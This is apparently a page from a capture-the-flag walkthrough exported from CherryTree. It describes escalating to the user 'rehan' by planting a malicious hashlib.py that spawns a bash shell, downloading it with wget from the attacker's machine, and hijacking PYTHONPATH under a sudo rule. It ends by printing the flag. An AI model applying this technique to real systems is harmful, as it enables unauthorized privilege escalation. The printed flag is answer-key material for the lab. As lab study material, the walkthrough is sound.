<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.2 Get user's privileges (First flag)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">4.2 Get user's privileges (First flag)</h1><br/><br />1. You have to find out the privilege of some user. On your shell run the following code.<br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">sudo</span>&nbsp;-l</div></div><br /><br />	<span style="color:#ffa500;">Output:</span><br />    <img src="images/954-1.png" alt="images/954-1.png" /><br /><br />    There's an user called <code>rehan</code> and he can run “/opt/md5.py” with NOPASSWORD.<br /><br />2. On your Kali Machine create a file called “hashlib.py” with the following content. (It's better to write the code)<br />    <div class="codebox"><div class="codebox">import&nbsp;os<br />class&nbsp;Test<span style="color:#a52a2a;font-weight:700">(</span>object<span style="color:#a52a2a;font-weight:700">):</span><br />&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__init__<span style="color:#a52a2a;font-weight:700">(</span>self,test<span style="color:#a52a2a;font-weight:700">):</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.test&nbsp;=&nbsp;<span style="color:#a52a2a;font-weight:700">test</span><br />&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;hexdigest<span style="color:#a52a2a;font-weight:700">(</span>self<span style="color:#a52a2a;font-weight:700">):</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a52a2a;font-weight:700">return</span>&nbsp;self.test<br />def&nbsp;md5<span style="color:#a52a2a;font-weight:700">(test):</span><br />&nbsp;&nbsp;&nbsp;&nbsp;os.system<span style="color:#a52a2a;font-weight:700">(</span><span style="color:#ff00ff;font-weight:400">"/bin/bash&nbsp;-i"</span><span style="color:#a52a2a;font-weight:700">)</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a52a2a;font-weight:700">return</span>&nbsp;Test<span style="color:#a52a2a;font-weight:700">(test)</span><br /></div></div><br /><br />3. On the victim's machine create a directory called “test” in the “/tmp” directory.<br />   <br />4. Go to “/tmp/test”, get the file “hashlib.py” from the Kali Machine and make it executable.<br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">wget</span>&nbsp;http<span style="color:#a52a2a;font-weight:700">://</span>192.168.12.10<span style="color:#a52a2a;font-weight:700">:</span>8000<span style="color:#a52a2a;font-weight:700">/</span>hashlib.py<br /><span style="color:#a52a2a;font-weight:700">chmod</span>&nbsp;777&nbsp;hashlib.py<br /></div></div><br /><br />5. Change PYTHONPATH environment.<br />    PYTHONPATH is an environment variable which you can set to add additional directories where python will look for modules and packages.<br /><br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">sudo</span>&nbsp;-u&nbsp;rehan&nbsp;PYTHONPATH=<span style="color:#a52a2a;font-weight:700">/</span>tmp<span style="color:#a52a2a;font-weight:700">/</span>test&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>opt<span style="color:#a52a2a;font-weight:700">/</span>md5.py<br /></div></div><br /><br />6. Show the “id”.<br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">id</span></div></div>     <br /><br />	<span style="color:#ffa500;">Output:</span><br />    <img src="images/954-2.png" alt="images/954-2.png" /><br /><br />7. Get the flag.<br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">cd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>home<span style="color:#a52a2a;font-weight:700">/</span>rehan<br /><span style="color:#a52a2a;font-weight:700">cat</span>&nbsp;user.txt</div></div><br /><br />	<span style="color:#ffa500;">Output:</span><br />    <img src="images/954-3.png" alt="images/954-3.png" /> <br />    de0a7d9cb0e1ae6190e85549f63a26c1<br /></div></body></html>